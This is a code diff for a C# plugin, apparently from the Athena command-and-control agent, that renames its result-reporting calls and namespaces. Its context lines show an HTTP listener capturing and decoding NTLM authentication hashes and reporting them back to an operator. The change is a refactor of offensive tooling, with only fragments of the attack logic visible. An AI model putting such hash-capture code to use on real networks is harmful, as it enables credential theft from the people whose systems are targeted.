@@ -8,7 +8,8 @@ using System.Collections;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using Athena.Plugins;
+using Athena.Commands.Models;
+using Athena.Commands;
 
 namespace Plugin
 {
@@ -47,11 +48,11 @@ namespace Plugin
                 {
                     if (e.ToString().Contains("WSACancelBlockingCall"))
                     {
-                        PluginHandler.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                        TaskResponseHandler.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
                     }
                     else
                     {
-                        PluginHandler.Write(e.ToString(), Config.task_id, true, "error");
+                        TaskResponseHandler.Write(e.ToString(), Config.task_id, true, "error");
 
                     }
                 }
@@ -116,11 +117,11 @@ namespace Plugin
             {
                 if (e.ToString().Contains("WSACancelBlockingCall"))
                 {
-                    PluginHandler.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                    TaskResponseHandler.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
                 }
                 else
                 {
-                    PluginHandler.Write(e.ToString(), Config.task_id, true, "error");
+                    TaskResponseHandler.Write(e.ToString(), Config.task_id, true, "error");
 
                 }
                 this.Stop();
@@ -148,7 +149,7 @@ namespace Plugin
                         var NTLMHashString = DecodeNTLM(NTLMHash);
                         sb.AppendLine("[*] Capture hash:");
                         sb.AppendLine(NTLMHashString);
-                        PluginHandler.Write(sb.ToString(), Config.task_id, false);
+                        TaskResponseHandler.Write(sb.ToString(), Config.task_id, false);
                         return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: Close\r\nContent-Length: 11\r\n\r\nNot Found\r\n";
                     }
                 }
